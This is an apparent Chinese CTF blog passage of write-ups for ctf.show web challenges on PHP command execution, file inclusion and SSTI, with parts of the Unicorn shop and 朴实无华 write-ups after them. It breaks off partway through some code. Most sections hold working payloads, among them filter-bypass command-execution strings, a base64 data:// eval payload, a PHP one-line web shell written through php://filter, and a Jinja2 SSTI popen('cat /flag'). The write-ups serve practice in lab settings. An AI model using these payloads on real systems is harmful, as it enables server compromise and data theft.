<h3 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75-76"></a>web 75-76</h3><p>用到了php中保存目录的类：Directoryiterator</p>
<p>DirectoryIterator 类提供了一个简单的界面来查看文件系统目录的内容。</p>
<p>我们可以直接在网页中编写实例一个DirectoryIterator对象，然后用一个循环遍历出它里面包含的文件</p>
<p>payload：</p>
<p><code>?&gt;&lt;?php $a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f-&gt;__toString().&quot; &quot;;&#125;exit();</code></p>
<p>可以找到flag36.txt文件</p>
<p>这里需要用到PDO类链接数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php页面链接数据库例子：</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">dbms=<span class="string">&#x27;mysql&#x27;</span>;     //数据库类型</span></span><br><span class="line"><span class="meta">$</span><span class="bash">host=<span class="string">&#x27;localhost&#x27;</span>; //数据库主机名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbName=<span class="string">&#x27;test&#x27;</span>;    //使用的数据库</span></span><br><span class="line"><span class="meta">$</span><span class="bash">user=<span class="string">&#x27;root&#x27;</span>;      //数据库连接用户名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">pass=<span class="string">&#x27;&#x27;</span>;          //对应的密码</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dsn=<span class="string">&quot;<span class="variable">$dbms</span>:host=<span class="variable">$host</span>;dbname=<span class="variable">$dbName</span>&quot;</span>;</span></span><br></pre></td></tr></table></figure>

<p>所以我们现在需要初始化的内容<code>$dbh = new PDO($dsn, $user, $pass); *//初始化一个PDO对象*</code></p>
<p>需要提供账号密码还有数据库信息</p>
<p>也不知道师傅们是怎么拿到数据库的信息的：</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">dbh = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span></span><br><span class="line"><span class="meta">	foreach($</span><span class="bash">dbh-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>)as <span class="variable">$row</span>)&#123;<span class="comment">#76是36d</span></span></span><br><span class="line"><span class="meta">		echo($</span><span class="bash">row[0]).<span class="string">&quot;|&quot;</span>;&#125;</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">dbh = NULL;</span></span><br><span class="line">	</span><br><span class="line">&#125;catch (POException $e)&#123;</span><br><span class="line">	echo $e-&gt;getMessage();</span><br><span class="line">	die();	</span><br><span class="line">	&#125;exit();</span><br></pre></td></tr></table></figure>



<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
<p>原理：在数据库中查找flag36.txt然后抛出异常，输出其中内容</p>
<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>一样可以用上面的代码读取到文件目录，可以看到flag在falg36x.txt或者readflag中</p>
<p>但是我们用上面的sql方法读取文件的时候发现，sql被ban了，得想另一种办法</p>
<p>可以利用FFI（但是FFI只有在php7.4之后才有）</p>
<p>新姿势：$ffi = FFI::cdef(“int system(const char *command);”);创建一个system对象</p>
<p>然后将readflag重定向</p>
<p>最后调用system执行$a</p>
<p>最后访问我们重定向的文件</p>
<h3 id="web-118"><a href="#web-118" class="headerlink" title="web 118"></a>web 118</h3><p>这题又是一个新姿势，我们可以利用环境变量或者路径含有的字母来执行命令</p>
<p>这题没有过滤空格还有路径包含</p>
<p>而且给出的提示中有当前目录是/var/www/html</p>
<p>以及环境变量是/bin</p>
<p>我们可以调用环境变量的最后一个字母（~A）以及当前目录中最后一个字母组成nl后面包含题目给我们的flag所在位置（？没有被ban）</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;PATH~A&#125;<span class="variable">$&#123;PWD~A&#125;</span>????.???</span></span><br></pre></td></tr></table></figure>

<p>附上LINUX的环境变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查看环境变量  (environment)</span><br><span class="line">env</span><br><span class="line">一些环境变量说明</span><br><span class="line">HOSTNAME=linux.dmtsai.tw  主机名称</span><br><span class="line">SHELL=/bin/bash  当前环境下，使用的shell是哪一个程序。</span><br><span class="line">TERM=xterm  终端使用的环境是什么类型</span><br><span class="line">HISTSIZE=1000 记录命令的数目</span><br><span class="line">USER=root  用户的名称</span><br><span class="line">ENV=/root/.bashrc  使用的个人环境设置文件</span><br><span class="line">MAIL=/var/spool/mail/root  这个用户所采用的邮箱位置</span><br><span class="line">PATH=/sbin:/usr/sbin:/bin  执行文件命令搜索路径</span><br><span class="line">PWD=/root  当前用户所在的工作目录(利用pwd取出)</span><br><span class="line">LANG=en_US,UTF-8 与语系有关</span><br><span class="line">HOME=/root 用户的家目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web-119"><a href="#web-119" class="headerlink" title="web 119"></a>web 119</h3><p>跟上题类似但是需要构造不一样的东西上题构造的是无法用的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#&#125;</span></span></span><br><span class="line">1:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">##&#125;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#SHLVL&#125;</span></span></span><br><span class="line">4-5:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#RANDOM&#125;</span></span></span><br><span class="line">/:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;##&#125;</span>&#125;</span></span><br><span class="line">t:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#HOSTNAME&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 PHP_CFLAGS=-fstack-protectcor-strong-fpic-fpie-o2-D_LARGEFILE_SOURCE -D_FI</span><br><span class="line">LE_OFFSET_BITS=64</span><br><span class="line">2</span><br><span class="line">3 PHP_VERSION=7.3.22 /版本</span><br><span class="line">4 SHLVL=2 /記錄多個bash進程實例嵌套深度的累加器</span><br><span class="line">5 [PATH] =&gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">6 [HOSTNAME] =&gt; glot-runner /主機名</span><br><span class="line">[PHPIZE_DEPS] =&gt; autoconf dpkg-dev file g++</span><br><span class="line">gcc libc-dev make pkg-config re2c</span><br><span class="line">7</span><br><span class="line">8 [PHP_INI_DIR] =&gt; /usr/local/etc/php</span><br><span class="line">9 [PHP_CFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">10 [PHP_CPPFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">11 [PHP_LDFLAGS] =&gt; -Wl,-O1 -Wl,--hash-style=both -pie</span><br><span class="line">[GPG_KEYS] =&gt; 1729F83938DA44E27BA0F4D3DBDB397470D12172 B1B44D8F021E4E2</span><br><span class="line">D6021E995DC9FF8D3EE5AF27F</span><br><span class="line">12</span><br><span class="line">13 [PHP_VERSION] =&gt; 7.2.1</span><br><span class="line">14</span><br><span class="line">[PHP_ASC_URL] =&gt; https://secure.php.net/get/php-7.2.1.tar.xz.asc/from/</span><br><span class="line">this/mirror</span><br><span class="line">15</span><br><span class="line">[PHP_SHA256] =&gt; 6c6cf82fda6660ed963821eb0525214bb3547e8e29f447b9c15b2d</span><br><span class="line">8e6efd8822</span><br><span class="line">16</span><br><span class="line">17 [PHP_MD5] =&gt;</span><br><span class="line">18 [HOME] =&gt; /home/glot</span><br><span class="line">19 [PHP_SELF] =&gt; /tmp/543750210/main.php</span><br><span class="line">20 [SCRIPT_NAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">21 [SCRIPT_FILENAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">22 [PATH_TRANSLATED] =&gt; /tmp/543750210/main.php</span><br><span class="line">23 [DOCUMENT_ROOT] =&gt;</span><br><span class="line">24 [REQUEST_TIME_FLOAT] =&gt; 1524198667.12</span><br><span class="line">25 [REQUEST_TIME] =&gt; 1524198667</span><br><span class="line">26 [argv] =&gt; Array</span><br><span class="line">27 (</span><br><span class="line">28 [0] =&gt; /tmp/543750210/main.php</span><br><span class="line">29 )</span><br><span class="line">30 [argc] =&gt; 1</span><br><span class="line">31 )</span><br></pre></td></tr></table></figure>

<p>非预期：</p>
<p>可以看到PHP_CFLAGS中含有tac，直接构造数字3取PHP_CFLAGS的第三个的三位就行了</p>
<h3 id="web-120"><a href="#web-120" class="headerlink" title="web 120"></a>web 120</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span></span><br><span class="line">    $code=$_POST[&#x27;code&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    </span><br><span class="line">        if(strlen($code)&gt;65)&#123;</span><br><span class="line">            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>上面的题目虽然没有过滤，但是我们用的长度太长了会被后面的小于65pass</p>
<p>所以我们的换一种方法构造</p>
<p>可以尝试一下构造base64</p>
<p>我们只需要构造出4和6</p>
<p>我们还记得118的提示</p>
<p>然后PHP_VERSION的长度是6</p>
<p>pwd的长度是4</p>
<p>可以构造</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">????$&#123;#PWD&#125; ????.???  #base64 flag.php</span><br></pre></td></tr></table></figure>

<p>但是没办法执行，应该是位置发生了什么变化把，换一种方法，构造出/bin然后直接执行看看</p>
<p>想到可以构造/bin/base64 ????.???</p>
<p>现在的问题就是构造一个/</p>
<p>可以用pwd的第一个字符就是/</p>
<p><code>$&#123;PWD::$</code>的效果跟他一样的直接替换</p>
<p>替换之后用上面的payload继续打</p>
<h3 id="web-122"><a href="#web-122" class="headerlink" title="web 122"></a>web 122</h3><p>可以看到我们用pwd提取/但是pwd被过滤了</p>
<p>发现没有过滤HOME，而且HOME返回的是家目录也是含有/但是#也被过滤了查了一下可以用<code>$?</code>，它表示上一条命令的返回值，如果是0则表示执行成功，如果是非0则表示执行有误</p>
<p>用<code>$&#123;HOME::$?&#125;</code></p>
<h3 id="web-124"><a href="#web-124" class="headerlink" title="web 124"></a>web 124</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这道题同样限制了长度，并且添加了黑白名单：</p>
<p>过滤了<code>空格，换行，tab，单双引号还有中括号</code></p>
<p>他特别提示了用到数学符号，而且在这边给出了进制转换的几个函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">base_convert随机进制转换</span><br><span class="line">hexdec十六进制转换成十进制</span><br><span class="line">dechex十进制转换成十六进制</span><br><span class="line">原本只需要base_convert就足够了，但是这题同样限制了80长度，只用这个的话长度不够，所以我们必须结合利用</span><br><span class="line">我们知道我们在执行的时候是以二进制数据进行程序执行的</span><br><span class="line">所以我们可以构造rce</span><br><span class="line">以GET方式传入一个数，然后我们就可以随机构造我们想要的系统命令了</span><br></pre></td></tr></table></figure>

<p>可以看到我们直可以用它给的函数还有数字，还有除了上面其余符号，</p>
<p>我们可以构造一个十进制，然后让他转换成二进制字符串，但是上面没有给我们函数来转换成2进制字符串</p>
<p>所以说我们需要构造一个参数让他转换成2进制字符串</p>
<p>看了一下他给的数学函数需要返回字符串的话我们只能使用</p>
<p><code>hex2bin</code>函数，这个函数会将16进制转换成二进制字符串</p>
<p>也就是说我们需要用base_convert转换出hex2bin</p>
<p>直接去找一个在线网站转换就行了<code>37907361743</code></p>
<p>然后构造base_convert(37907361743,10,36)就可以构造出hex2bin</p>
<p>然后我们就可以构造一个_GET了</p>
<p>1598506324</p>
<p>然后直接拼接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))#_GET</span><br></pre></td></tr></table></figure>

<p>这样我们就构造好了_GET因为中括号被过滤了我们可以用大括号代替中间的就用上面给定的函数来覆盖，</p>
<p>可以构造$pi=base_convert(37907361743,10,36)(dechex(1598506324))</p>
<p>因为长度限定我们可以使用变量定义一下，把这个复制给$pi</p>
<p>然后用$$pi构造出$_GET{abs}，但是因为我们没办法使用单引号，所以我们还需要构造一个参数，然后让他组成<code>函数（参数）</code>的方式，然后函数，参数都用get传入</p>
<p>也就是说需要构造<code>c=$_GET&#123;abs&#125;（$_GET&#123;exp&#125;）</code>然后我们再传入abs还有exp就可以rce</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;exp&#125;);&amp;abs=system&amp;exp=tac f*</span><br></pre></td></tr></table></figure>

<h2 id="——命令执行结束——"><a href="#——命令执行结束——" class="headerlink" title="——命令执行结束——"></a>——命令执行结束——</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><p>用php伪协议</p>
<h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><p>用data伪协议</p>
<h3 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h3><p>随便输入一个页面查看服务器的系统</p>
<p>用file伪协议抓包之后在网页的标头信息构造漏洞在日志文件中getshell</p>
<h3 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h3><p>直接file=文件的日志文件</p>
<p>然后抓包构造标头</p>
<h3 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h3><p>环境有问题，现在没办法做</p>
<h3 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span></span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要写入content数据写进file中，但是要绕过这个die</p>
<p>考到了伪协议绕过，我们可以用伪协议编码绕过，用base64或者是rot13base64解码的时候<?;>等会被忽略，最后也就会变成phpdie然后添加两个字符之后对后面的数再继续进行解码这样我们就直接绕过了这个死亡杂糅（我这题base64没做出来，用的rot13）rot13编码之后` <?php die('大佬别秀了');?><code>会变成</code><?cuc qvr('大佬别秀了');?>`再进行一次编码他就会恢复原状，如果php没有开启短标签的话，php不认识这个字符那么他就不会执行，我们直接在后面添加我们想要输入的代码然后进行一次rot13编码，当他在进行一次rot13编码的时候，他就会变成我们想要输入的原始形态，就绕过了前面的die不会退出。</p>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xz.aliyun.com/t/8163#toc-3</span><br><span class="line">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</span><br></pre></td></tr></table></figure>



<h3 id="web-88"><a href="#web-88" class="headerlink" title="web 88"></a>web 88</h3><p>过滤的字符串</p>
<p>php ~ !   @ #   $   %  ^  &amp;  *   (     )   -    _  +  =  .</p>
<p>跟前面一样，可以直接用data伪协议读，但是解码之后最后可能会有= + 等符号，可以在后面直接加几个1来混淆</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">data:text/plain;base64,加上base64编码</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ2NhdCBmKicpKTsgPz4xMTEx</span><br></pre></td></tr></table></figure>



<h3 id="web-116"><a href="#web-116" class="headerlink" title="web 116"></a>web 116</h3><p>打开可以看到是一个MP4文件，先下载下来然后用foremost分离</p>
<p>打开png文件发现图片就是源码</p>
<p>审计发现直接get方式传入一个file名就行了但是需要抓个包才能看返回值</p>
<h3 id="web-117"><a href="#web-117" class="headerlink" title="web 117"></a>web 117</h3><h4 id="ucs-2编码"><a href="#ucs-2编码" class="headerlink" title="ucs-2编码"></a>ucs-2编码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php eval($_POST[a]); ?&gt;&#x27;);</span><br></pre></td></tr></table></figure>

<p>他的返回值就是经过编码之后的</p>
<p>然后我们直接用伪协议写<code>php://filter/write=convert.UCS-2LE.UCS-2BE/resource=a.php</code></p>
<p>来写入文件到a.php</p>
<p>contents传入我们转码之后的一句话木马</p>
<p>contents=?&lt;hp+pvela$(P_SO[T]1;)&gt;?也就是<code>&lt;?php eval($_POST[1]); ?&gt;</code></p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
<p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
<p>既然是ssti那么我们直接测试一下49看一下</p>
<p>如果返回的是7777777那么就是jinjia2</p>
<p>如果返回的是49那么就是twig</p>
<p>成功返回了49，那就肯定了就是这里。</p>
<p>那么我们直接开始调用里面的魔术方法</p>
<p><code>&#39;&#39;.__class__.__mro__</code>可以看到object类在2那么数组就是1，然后我们进去看一看它里面的类</p>
<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()</code>可以看到回显了很多类，我们查找可以执行os命令的类</p>
<p>找到了在133，那么数组就是132我们直接调用初始化，然后globals全局来查找可以使用的方法及变量参数</p>
<p>这里面os是空的，继续找，找到popen</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>ctf-show</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicorn shop</title>
    <url>/2022/02/28/Unicorn-shop/</url>
    <content><![CDATA[<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>刷题刷题。</p>
<p>题目名字是独角兽商店</p>
<p>进去看看</p>
<p><img src="/2022/02/28/Unicorn-shop/6.png" alt="1"></p>
<p>意思是我们输入商品名还有价钱来购买它</p>
<p>啥也不输直接点购买看看会出现什么问题：</p>
<p><img src="/2022/02/28/Unicorn-shop/1.png" alt="1"></p>
<p>可以看到返回了一堆目录还有一个报错</p>
<p>需要一个单独的unicode字符串作为参数</p>
<p>那么我们试试输入，购买上面的便宜的商品看看，</p>
<p>发现</p>
<p><img src="/2022/02/28/Unicorn-shop/2.png" alt="1"></p>
<p>测试一个最下面的那个，最下面吗那个应该是我们需要购买的flag</p>
<p><img src="/2022/02/28/Unicorn-shop/4.png" alt="1"></p>
<p>也不让访问</p>
<p>看看源码</p>
<p><img src="/2022/02/28/Unicorn-shop/3.png" alt="1"></p>
<p>他在编码后面添加了一句提示，那么可能在编码方面可能会出现一些问题，上网查了一下，我们需要找到一个字符，它的数值需要大于1337，从而绕过这个过滤</p>
<p>可以在这里找</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/</span><br></pre></td></tr></table></figure>

<p>直接搜索thousand，在里面找，只要它的数值大于1337的就行了</p>
<p><img src="/2022/02/28/Unicorn-shop/5.png" alt="1"></p>
<p>输入，返回flag</p>
]]></content>
      <tags>
        <tag>ASIS</tag>
      </tags>
  </entry>
  <entry>
    <title>朴实无华</title>
    <url>/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
    <content><![CDATA[<h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p>小刷一下。</p>
<p>进入题目发现</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/1.png" alt="1"></p>
<p>网页啥也没有，让我们黑他，但是这个标题上面是一串乱码，但是结尾有个很明显的bot</p>
<p>猜测页面含有一个机器人</p>
<p>访问robots.txt发现</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/2.png" alt="1"></p>
<p>果然给出了提示，说是虚假的flag存在这个文件中</p>
<p>进去看看</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/3.png" alt="1"></p>
<p>给了一个虚假的flag，抱着开玩笑的心态提交了一下，哈哈当然不行，在标头的地方找到了另一个提示</p>
<p>继续访问页面</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/4.png" alt="1"></p>
<p>我终于直到为什么叫朴实无华了</p>
<p>但是都是一串乱码，去网上找了正常的题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 